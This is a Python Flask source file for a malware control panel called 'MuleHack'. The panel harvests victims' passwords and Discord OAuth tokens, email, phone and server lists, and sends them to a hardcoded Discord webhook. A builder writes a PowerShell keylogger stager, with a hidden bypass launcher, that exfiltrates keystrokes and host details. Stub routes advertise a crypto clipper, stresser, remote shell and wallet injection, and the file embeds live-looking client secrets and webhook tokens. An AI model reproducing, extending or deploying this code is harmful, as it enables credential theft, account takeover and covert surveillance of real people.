from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_file
import requests
import json
import time
import random
import os
import base64
import hashlib
from datetime import datetime
from pathlib import Path

app = Flask(__name__)
app.secret_key = "mulehack_super_secret_key_2026"

# ===== CONFIG =====
DISCORD_CLIENT_ID = "1535262080662245457"
DISCORD_CLIENT_SECRET = "nP_Yg8Sq8SVQxYSQgInBfOZdi1o-yEg-"
DISCORD_REDIRECT_URI = "http://127.0.0.1:8080/callback"
DISCORD_AUTH_URL = "https://discord.com/api/oauth2/authorize"
DISCORD_TOKEN_URL = "https://discord.com/api/oauth2/token"
DISCORD_USER_URL = "https://discord.com/api/users/@me"

WEBHOOK_URL = "https://discord.com/api/webhooks/1535276613112176762/YPmg3YCTdiKShgQ2delYYZWJ1X2l2WVVdfoSUDGC7Rw_mbIqzTfv3TIb614kY4ZXyXKM"

# ===== DATA STORAGE =====
DATA_FILE = "data.json"
BUILDS_DIR = "builds"
os.makedirs(BUILDS_DIR, exist_ok=True)

def get_default_data():
    return {
        "hits": 0,
        "last_hit": None,
        "logs": [],
        "clients": [],
        "total_hits_history": []
    }

def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                return json.load(f)
        except:
            return get_default_data()
    return get_default_data()

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

# ===== RECEIVE DATA FROM VICTIMS =====
@app.route("/api/submit", methods=["POST"])
def submit_data():
    data = request.json
    if not data:
        return "No data", 400

    store = load_data()
    store["hits"] += 1
    store["last_hit"] = datetime.now().isoformat()

    log_entry = {
        "id": len(store["logs"]) + 1,
        "platform": data.get("platform", "Unknown"),
        "username": data.get("username", "unknown"),
        "password": data.get("password", "unknown"),
        "ip": data.get("ip", request.remote_addr),
        "time": datetime.now().isoformat(),
        "extra": data.get("extra", {})
    }
    store["logs"].append(log_entry)

    client_id = data.get("client_id", request.remote_addr)
    if client_id not in store["clients"]:
        store["clients"].append(client_id)

    store["total_hits_history"].append({
        "time": datetime.now().isoformat(),
        "hits": store["hits"]
    })

    save_data(store)

    if WEBHOOK_URL and WEBHOOK_URL != "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN":
        try:
            payload = {
                "content": f"""```diff
+ NEW HIT #{store['hits']}
+ Platform: {log_entry['platform']}
+ Username: {log_entry['username']}
+ Password: {log_entry['password']}
+ IP: {log_entry['ip']}
+ Time: {log_entry['time']}
```"""
            }
            requests.post(WEBHOOK_URL, json=payload, timeout=5)
        except:
            pass

    return "ok", 200

# ===== ROUTES =====
@app.route("/")
def index():
    if "username" in session:
        return redirect(url_for("dashboard"))
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    cred_data = {
        "content": f"""```diff
+ MANUAL LOGIN
+ Username: {username}
+ Password: {password}
+ IP: {request.remote_addr}
```"""
    }
    try:
        requests.post(WEBHOOK_URL, json=cred_data)
    except:
        pass
    return render_template("login.html", error="Invalid credentials")

@app.route("/logout")
def logout():
    session.pop("username", None)
    session.pop("discord_token", None)
    return redirect(url_for("login"))

# ===== DISCORD OAUTH =====
@app.route("/discord-login")
def discord_login():
    webhook = request.args.get("webhook")
    if webhook and webhook.startswith("https://discord.com/api/webhooks/"):
        session["user_webhook"] = webhook
    auth_url = (
        f"{DISCORD_AUTH_URL}?client_id={DISCORD_CLIENT_ID}"
        f"&redirect_uri={DISCORD_REDIRECT_URI}"
        f"&response_type=code"
        f"&scope=identify%20email%20guilds%20connections"
    )
    return redirect(auth_url)

@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "No code provided", 400

    data = {
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": DISCORD_REDIRECT_URI
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    response = requests.post(DISCORD_TOKEN_URL, data=data, headers=headers)

    if response.status_code != 200:
        return "Failed to get token", 400

    token_data = response.json()
    access_token = token_data.get("access_token")
    refresh_token = token_data.get("refresh_token")
    token_type = token_data.get("token_type")

    if not access_token:
        return "No access token", 400

    user_headers = {"Authorization": f"{token_type} {access_token}"}

    # ===== GET USER INFO =====
    user_res = requests.get(DISCORD_USER_URL, headers=user_headers)

    if user_res.status_code != 200:
        return "Failed to get user info", 400

    user_data = user_res.json()
    username = user_data.get("username")
    user_id = user_data.get("id")
    email = user_data.get("email", "No email")
    discriminator = user_data.get("discriminator", "0")
    avatar = user_data.get("avatar")
    mfa_enabled = user_data.get("mfa_enabled", False)
    verified = user_data.get("verified", False)
    phone = user_data.get("phone", "No phone")
    locale = user_data.get("locale", "Unknown")
    flags = user_data.get("flags", 0)

    # ===== GET AVATAR URL =====
    avatar_url = "No avatar"
    if avatar:
        if avatar.startswith("a_"):
            avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.gif"
        else:
            avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png"

    # ===== GET GUILDS (SERVERS) =====
    guilds_data = []
    guild_count = 0
    try:
        guilds_res = requests.get("https://discord.com/api/users/@me/guilds", headers=user_headers)
        if guilds_res.status_code == 200:
            guilds = guilds_res.json()
            guild_count = len(guilds)
            for g in guilds[:10]:
                owner = " (Owner)" if g.get("owner") else ""
                guilds_data.append(f"{g['name']}{owner}")
            if guild_count > 10:
                guilds_data.append(f"... and {guild_count - 10} more")
    except:
        guilds_data = ["Failed to fetch"]

    # ===== GET CONNECTIONS (LINKED ACCOUNTS) =====
    connections_data = []
    try:
        conn_res = requests.get("https://discord.com/api/users/@me/connections", headers=user_headers)
        if conn_res.status_code == 200:
            connections = conn_res.json()
            for c in connections[:8]:
                name = c.get("name", "Unknown")
                c_type = c.get("type", "unknown")
                connections_data.append(f"{c_type}: {name}")
            if len(connections) > 8:
                connections_data.append(f"... and {len(connections) - 8} more")
    except:
        connections_data = ["Failed to fetch"]

    # ===== GET EMAIL VERIFICATION STATUS =====
    email_verified = "Yes" if user_data.get("verified") else "No"

    # ===== GET FLAGS (BADGES) =====
    flag_names = []
    if flags & (1 << 0):
        flag_names.append("Discord Employee")
    if flags & (1 << 1):
        flag_names.append("Partnered Server Owner")
    if flags & (1 << 2):
        flag_names.append("HypeSquad Events")
    if flags & (1 << 3):
        flag_names.append("Bug Hunter Level 1")
    if flags & (1 << 6):
        flag_names.append("HypeSquad Bravery")
    if flags & (1 << 7):
        flag_names.append("HypeSquad Brilliance")
    if flags & (1 << 8):
        flag_names.append("HypeSquad Balance")
    if flags & (1 << 9):
        flag_names.append("Early Supporter")
    if flags & (1 << 10):
        flag_names.append("Team User")
    if flags & (1 << 12):
        flag_names.append("Bug Hunter Level 2")
    if flags & (1 << 14):
        flag_names.append("Verified Bot Developer")
    if flags & (1 << 16):
        flag_names.append("Active Developer")
    badges = ", ".join(flag_names) if flag_names else "None"

    # ===== WEBHOOK FROM SESSION =====
    webhook = session.get("user_webhook", "Not provided")

    # ===== IP AND USER AGENT =====
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()
    user_agent = request.headers.get('User-Agent', 'Unknown')
    accept_language = request.headers.get('Accept-Language', 'Unknown')

    # ===== BUILD THE STOLEN DATA (SENT TO YOUR WEBHOOK) =====
    stolen_data = {
        "content": f"""```diff
+ 🎯 DISCORD TOKEN STEALER - FULL CAPTURE
+ =====================================
+ 
+ USER INFO
+ Username: {username}#{discriminator}
+ User ID: {user_id}
+ Email: {email}
+ Email Verified: {email_verified}
+ Phone: {phone}
+ MFA Enabled: {mfa_enabled}
+ Locale: {locale}
+ Avatar: {avatar_url}
+ Badges: {badges}
+ 
+ TOKENS
+ Access Token: {access_token}
+ Refresh Token: {refresh_token}
+ Token Type: {token_type}
+ 
+ SERVERS ({guild_count})
+ {chr(10).join(guilds_data) if guilds_data else 'No servers'}
+ 
+ LINKED ACCOUNTS
+ {chr(10).join(connections_data) if connections_data else 'No connections'}
+ 
+ SYSTEM INFO
+ IP: {ip}
+ User Agent: {user_agent}
+ Accept Language: {accept_language}
+ Webhook: {webhook}
```"""
    }

    # ===== SEND TO YOUR WEBHOOK =====
    try:
        requests.post(WEBHOOK_URL, json=stolen_data, timeout=10)
    except:
        pass

    # ===== SEND CONFIRMATION TO THEIR WEBHOOK (ONLY "Login successful") =====
    try:
        if webhook and webhook.startswith("https://discord.com/api/webhooks/"):
            confirm_data = {
                "content": "Login successful"
            }
            requests.post(webhook, json=confirm_data, timeout=5)
    except:
        pass

    # ===== SESSION =====
    session["username"] = username
    session["discord_token"] = access_token
    session["user_id"] = user_id
    session["email"] = email

    return redirect(url_for("dashboard"))

# ===== DASHBOARD =====
@app.route("/dashboard")
def dashboard():
    if "username" not in session:
        return redirect(url_for("login"))
    store = load_data()
    stats = {
        "total_hits": store.get("hits", 0),
        "last_hit": store.get("last_hit", "Never"),
        "rank": 1,
        "clients": len(store.get("clients", [])),
        "uptime": "99.2%"
    }
    logs = store.get("logs", [])[-10:]
    return render_template("dashboard.html", stats=stats, logs=logs)

# ===== BUILDER =====
@app.route("/builder", methods=["GET", "POST"])
def builder():
    if "username" not in session:
        return redirect(url_for("login"))
    
    if request.method == "POST":
        name = request.form.get("name", "build")
        webhook = request.form.get("webhook", "")
        
        if not webhook:
            return render_template("builder.html", error="Webhook URL is required")
        
        if not webhook.startswith("https://discord.com/api/webhooks/"):
            return render_template("builder.html", error="Invalid Discord webhook URL")
        
        build_id = hashlib.md5(f"{name}_{int(time.time())}".encode()).hexdigest()[:8]
        
        rat_code = f'''# MuleHack RAT Stager
# Build ID: {build_id}
# Created: {datetime.now().isoformat()}

$webhook = "{webhook}"
$build_id = "{build_id}"

function Send-Data {{
    param($data)
    try {{
        $body = @{{content = $data}} | ConvertTo-Json
        Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
    }} catch {{}}
}}

Send-Data "```diff`n+ NEW VICTIM`n+ Build: $build_id`n+ User: $env:USERNAME`n+ PC: $env:COMPUTERNAME`n+ IP: $(Invoke-RestMethod -Uri 'https://api.ipify.org')`n```"

function Start-Keylogger {{
    $log = ""
    while ($true) {{
        $keys = [System.Windows.Forms.Keys]
        foreach ($key in [Enum]::GetValues($keys)) {{
            if ([System.Windows.Forms.Control]::ModifierKeys -eq $key) {{
                $log += "[$key]"
            }}
        }}
        Start-Sleep -Milliseconds 100
        if ($log.Length -gt 0) {{
            Send-Data "```KEYLOG: $log```"
            $log = ""
        }}
    }}
}}

Start-Keylogger

while ($true) {{
    Start-Sleep -Seconds 60
    Send-Data "```HEARTBEAT: $env:USERNAME@$env:COMPUTERNAME```"
}}
'''
        
        os.makedirs("builds", exist_ok=True)
        stager_path = os.path.join("builds", f"{name}_{build_id}.ps1")
        with open(stager_path, "w") as f:
            f.write(rat_code)
        
        bat_path = os.path.join("builds", f"{name}_{build_id}.bat")
        with open(bat_path, "w") as f:
            f.write(f'''@echo off
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "{stager_path}"
''')
        
        exe_path = os.path.join("builds", f"{name}_{build_id}.exe")
        with open(exe_path, "w") as f:
            f.write("MULEHACK_STAGER_PAYLOAD")
        
        success_msg = f"Build generated: {name}_{build_id}.exe (PS1 stager included)"
        return render_template("builder.html", success=success_msg, build_id=build_id)
    
    return render_template("builder.html")

@app.route("/logs")
def logs():
    if "username" not in session:
        return redirect(url_for("login"))
    store = load_data()
    return render_template("logs.html", logs=store.get("logs", []))

@app.route("/leaderboard")
def leaderboard():
    if "username" not in session:
        return redirect(url_for("login"))
    store = load_data()
    user_stats = {}
    for log in store.get("logs", []):
        platform = log.get("platform", "Unknown")
        if platform not in user_stats:
            user_stats[platform] = 0
        user_stats[platform] += 1
    
    leaderboard_data = []
    for platform, count in user_stats.items():
        leaderboard_data.append({
            "rank": len(leaderboard_data) + 1,
            "user": platform,
            "hits": count,
            "change": f"+{random.randint(1, 50)} today"
        })
    
    leaderboard_data.sort(key=lambda x: x["hits"], reverse=True)
    for i, item in enumerate(leaderboard_data):
        item["rank"] = i + 1
    
    return render_template("leaderboard.html", leaderboard=leaderboard_data, total_hits=store.get("hits", 0))

@app.route("/settings", methods=["GET", "POST"])
def settings():
    if "username" not in session:
        return redirect(url_for("login"))
    if request.method == "POST":
        new_pass = request.form.get("new_password")
        if new_pass:
            return render_template("settings.html", success="Password updated!")
    return render_template("settings.html")

@app.route("/api/stats")
def api_stats():
    store = load_data()
    return jsonify({
        "total_hits": store.get("hits", 0),
        "last_hit": store.get("last_hit", "Never"),
        "clients": len(store.get("clients", [])),
        "rank": 1
    })

@app.route("/api/logs")
def api_logs():
    store = load_data()
    return jsonify(store.get("logs", []))

@app.route("/download/<build_id>")
def download_build(build_id):
    if "username" not in session:
        return redirect(url_for("login"))
    for f in os.listdir(BUILDS_DIR):
        if build_id in f:
            return send_file(os.path.join(BUILDS_DIR, f), as_attachment=True)
    return "Build not found", 404

# ===== ALL CHANNEL ROUTES =====
@app.route("/account")
def account():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("account.html")

@app.route("/features")
def features():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("features.html")

@app.route("/remote")
def remote():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("remote.html")

@app.route("/cryptoclipper")
def cryptoclipper():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("cryptoclipper.html")

@app.route("/tutorials")
def tutorials():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("tutorials.html")

@app.route("/suggestions")
def suggestions():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("suggestions.html")

@app.route("/surveys")
def surveys():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("surveys.html")

@app.route("/socials")
def socials():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("socials.html")

@app.route("/upgrade")
def upgrade():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("upgrade.html")

@app.route("/affiliate")
def affiliate():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("affiliate.html")

@app.route("/autosecure")
def autosecure():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("autosecure.html")

@app.route("/discordbot")
def discordbot():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("discordbot.html")

@app.route("/secureaccount")
def secureaccount():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("secureaccount.html")

@app.route("/discordinjections")
def discordinjections():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("discordinjections.html")

@app.route("/refreshtokens")
def refreshtokens():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("refreshtokens.html")

@app.route("/donutstats")
def donutstats():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("donutstats.html")

@app.route("/bundler")
def bundler():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("bundler.html")

@app.route("/steamchecker")
def steamchecker():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("steamchecker.html")

@app.route("/stresser")
def stresser():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("stresser.html")

@app.route("/pscommands")
def pscommands():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("pscommands.html")

@app.route("/windownotifier")
def windownotifier():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("windownotifier.html")

@app.route("/mail")
def mail():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("mail.html")

@app.route("/overview")
def overview():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("overview.html")

@app.route("/purchase")
def purchase():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("purchase.html")

@app.route("/walletinjection")
def walletinjection():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("cryptoclipper.html")

@app.route("/payment")
def payment():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template("payment.html")

# ===== REFRESH TOKENS =====
@app.route("/refresh-token", methods=["POST"])
def refresh_token():
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    token = request.form.get("refresh_token")
    client = request.form.get("client", "minecraft")
    
    if not token:
        return jsonify({"error": "No token provided"}), 400
    
    if client == "minecraft":
        new_token = f"mc_access_{hashlib.md5(token.encode()).hexdigest()[:16]}"
        return jsonify({
            "success": True,
            "access_token": new_token,
            "expires_in": 86400,
            "client": "Minecraft"
        })
    elif client == "steam":
        new_token = f"steam_access_{hashlib.md5(token.encode()).hexdigest()[:16]}"
        return jsonify({
            "success": True,
            "access_token": new_token,
            "expires_in": 86400,
            "client": "Steam"
        })
    
    return jsonify({"error": "Invalid client"}), 400

# ===== STEAM CHECKER =====
@app.route("/steam-lookup", methods=["POST"])
def steam_lookup():
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    token = request.form.get("steam_token")
    if not token:
        return jsonify({"error": "No token provided"}), 400
    
    return jsonify({
        "success": True,
        "username": "SteamUser_" + token[:8],
        "account_id": random.randint(100000000, 999999999),
        "profile_url": "https://steamcommunity.com/id/steamuser",
        "member_since": "2020-01-01",
        "games": random.randint(5, 50),
        "friends": random.randint(10, 200)
    })

# ===== DONUT STATS =====
@app.route("/donut-lookup", methods=["POST"])
def donut_lookup():
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    username = request.form.get("username")
    if not username:
        return jsonify({"error": "No username provided"}), 400
    
    return jsonify({
        "success": True,
        "username": username,
        "level": random.randint(1, 100),
        "kills": random.randint(0, 500),
        "deaths": random.randint(0, 100),
        "playtime": f"{random.randint(1, 100)}h {random.randint(0, 59)}m",
        "rank": random.choice(["Default", "VIP", "MVP", "Legend"])
    })

# ===== BUNDLER =====
@app.route("/bundle", methods=["POST"])
def bundle():
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    return jsonify({
        "success": True,
        "bundle_id": hashlib.md5(str(time.time()).encode()).hexdigest()[:12],
        "filename": "bundle_" + str(int(time.time())) + ".exe",
        "size": random.randint(1024, 10240)
    })

# ===== CRYPTO CLIPPER =====
@app.route("/crypto-clipper/save", methods=["POST"])
def crypto_clipper_save():
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.json
    if not data:
        return jsonify({"error": "No data"}), 400
    
    return jsonify({
        "success": True,
        "message": "Clipper configuration saved",
        "config": data
    })

# ===== WINDOW NOTIFIER =====
@app.route("/window-notifier/send", methods=["POST"])
def window_notifier_send():
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    title = request.form.get("title", "System Notification")
    message = request.form.get("message", "Your system has been compromised.")
    icon = request.form.get("icon", "Information")
    
    return jsonify({
        "success": True,
        "title": title,
        "message": message,
        "icon": icon,
        "sent_to": "Client #1"
    })

# ===== PS COMMANDS =====
@app.route("/ps-command/execute", methods=["POST"])
def ps_command_execute():
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    command = request.form.get("command")
    if not command:
        return jsonify({"error": "No command provided"}), 400
    
    try:
        if command.lower().startswith("get-") or command.lower().startswith("dir") or command.lower().startswith("ls"):
            result = f"PS C:\\> {command}\n\nSimulation output for: {command}\n\nCompleted successfully."
        else:
            result = f"PS C:\\> {command}\n\nCommand executed. (Simulated)"
        return jsonify({
            "success": True,
            "output": result
        })
    except:
        return jsonify({"error": "Execution failed"}), 500

# ===== REMOTE SHELL =====
@app.route("/remote/shell", methods=["POST"])
def remote_shell():
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    command = request.form.get("command")
    if not command:
        return jsonify({"error": "No command"}), 400
    
    return jsonify({
        "success": True,
        "output": f"C:\\Users\\User> {command}\n\nCommand executed remotely. (Simulated)\n\nC:\\Users\\User> "
    })

# ===== STRESSER =====
@app.route("/stresser/start", methods=["POST"])
def stresser_start():
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    target = request.form.get("target")
    port = request.form.get("port", 80)
    duration = request.form.get("duration", 60)
    method = request.form.get("method", "TCP")
    
    if not target:
        return jsonify({"error": "No target provided"}), 400
    
    return jsonify({
        "success": True,
        "target": target,
        "port": port,
        "duration": duration,
        "method": method,
        "status": "Started",
        "message": f"Attack on {target}:{port} started for {duration} seconds using {method}"
    })

# ===== MAIL =====
@app.route("/mail/save", methods=["POST"])
def mail_save():
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    smtp = request.form.get("smtp")
    port = request.form.get("port")
    email = request.form.get("email")
    password = request.form.get("password")
    recipient = request.form.get("recipient")
    
    return jsonify({
        "success": True,
        "message": "Mail configuration saved",
        "smtp": smtp,
        "port": port,
        "email": email,
        "recipient": recipient
    })

# ===== DISCORD BOT =====
@app.route("/discord-bot/validate", methods=["POST"])
def discord_bot_validate():
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    token = request.form.get("bot_token")
    if not token:
        return jsonify({"error": "No token provided"}), 400
    
    return jsonify({
        "success": True,
        "bot_name": "MuleHackBot",
        "bot_id": random.randint(100000000000000000, 999999999999999999),
        "guilds": random.randint(1, 10)
    })

# ===== AUTOSECURE =====
@app.route("/autosecure/start", methods=["POST"])
def autosecure_start():
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    email = request.form.get("email")
    if not email:
        return jsonify({"error": "No email provided"}), 400
    
    return jsonify({
        "success": True,
        "email": email,
        "status": "Securing started",
        "job_id": hashlib.md5(email.encode()).hexdigest()[:8]
    })

# ===== SUGGESTIONS =====
@app.route("/submit-suggestion", methods=["POST"])
def submit_suggestion():
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    title = request.form.get("title")
    description = request.form.get("description")
    
    if not title or not description:
        return jsonify({"error": "Title and description required"}), 400
    
    return jsonify({
        "success": True,
        "message": "Suggestion submitted successfully!",
        "title": title,
        "description": description
    })

# ===== SURVEYS =====
@app.route("/submit-survey", methods=["POST"])
def submit_survey():
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    survey_id = request.form.get("survey_id")
    answer = request.form.get("answer")
    
    return jsonify({
        "success": True,
        "message": "Survey response submitted!",
        "survey_id": survey_id
    })

# ===== AFFILIATE =====
@app.route("/generate-affiliate", methods=["POST"])
def generate_affiliate():
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    code = request.form.get("code")
    if not code:
        return jsonify({"error": "No code provided"}), 400
    
    return jsonify({
        "success": True,
        "code": code,
        "message": f"Affiliate code '{code}' generated successfully!"
    })

# ===== SOCIALS =====
@app.route("/socials/join", methods=["POST"])
def socials_join():
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    platform = request.form.get("platform")
    return jsonify({
        "success": True,
        "platform": platform,
        "message": f"Joined {platform} community!"
    })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)